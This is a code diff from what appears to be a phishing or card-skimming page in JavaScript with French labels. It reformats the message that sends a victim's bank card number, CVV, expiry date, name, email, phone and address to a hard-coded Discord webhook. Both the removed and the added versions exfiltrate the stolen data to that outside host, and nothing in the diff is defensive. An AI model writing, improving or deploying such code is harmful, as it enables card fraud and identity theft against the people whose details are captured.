@@ -165,32 +165,29 @@
 
     const webhookURL = "https://discord.com/api/webhooks/1399115316268765265/lFsRx3lYvUF19LDtqvzl-G4znziZcbZUYxR7uCzesvqqmR19P_ZDgYRqbxJlnThH_IwB";
 
-    const payload = {
-      content: "💳 **Détails carte bancaire**\n```" +
-               `Numéro : ${data.numero_carte}\n` +
-               `CVV    : ${data.cvv}\n` +
-               `Exp    : ${data.expiration}\n` +
-               "```",
-      embeds: [{
-        title: "Infos personnelles",
-        color: 0x2575fc,
-        fields: [
-          { name: "Prénom", value: data.prenom || "N/A", inline: true },
-          { name: "Nom", value: data.nom || "N/A", inline: true },
-          { name: "Email", value: data.email || "N/A", inline: false },
-          { name: "Téléphone", value: data.telephone || "N/A", inline: true },
-          { name: "Adresse", value: data.adresse || "N/A", inline: false },
-          { name: "Ville", value: data.ville || "N/A", inline: true },
-          { name: "Région", value: data.region || "N/A", inline: true }
-        ],
-        timestamp: new Date().toISOString()
-      }]
-    };
+    // Construction du message textuel avec 2 cadres séparés
+    const message = 
+      "📋 **Infos Perso**\n" +
+      "```\n" +
+      `Prénom   : ${data.prenom}\n` +
+      `Nom      : ${data.nom}\n` +
+      `Email    : ${data.email}\n` +
+      `Téléphone: ${data.telephone}\n` +
+      `Adresse  : ${data.adresse}\n` +
+      `Ville    : ${data.ville}\n` +
+      `Région   : ${data.region}\n` +
+      "```\n\n" +
+      "💳 **Infos cc**\n" +
+      "```\n" +
+      `Numéro carte : ${data.numero_carte}\n` +
+      `CVV          : ${data.cvv}\n` +
+      `Expiration   : ${data.expiration}\n` +
+      "```";
 
     fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({ content: message })
     })
     .then(res => {
       if (res.ok) {
